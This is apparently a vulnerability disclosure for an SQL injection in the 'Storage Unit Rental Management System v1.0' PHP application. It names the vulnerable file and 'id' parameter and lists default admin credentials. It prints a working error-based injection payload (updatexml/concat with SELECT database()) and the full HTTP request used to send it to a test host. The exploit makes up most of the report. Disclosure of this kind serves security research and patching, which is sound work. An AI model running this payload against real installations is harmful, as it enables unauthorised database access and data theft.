# Storage Unit Rental Management System v1.0 by sourcecodester has SQL injection 1

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /storage/admin/rents/manage_rent.php

Vulnerability location: /storage/admin/?page=rents/manage_rent&id=, id

dbname = storage_db

[+] Payload: /storage/admin/?page=rents/manage_rent&id=0%27%20and%20updatexml(1,%20concat(0x7e,%20(SELECT%20database()),%200x7e),%201)--+ // Leak place ---> id

```sql
GET /storage/admin/?page=rents/manage_rent&id=0%27%20and%20updatexml(1,%20concat(0x7e,%20(SELECT%20database()),%200x7e),%201)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=30ohdkf99du0vfp79d5hmk7701
Connection: close


```

<img width="1889" height="512" alt="image" src="https://github.com/user-attachments/assets/6c01f8a3-2ff3-4b6a-84b4-203b12cc561c" />
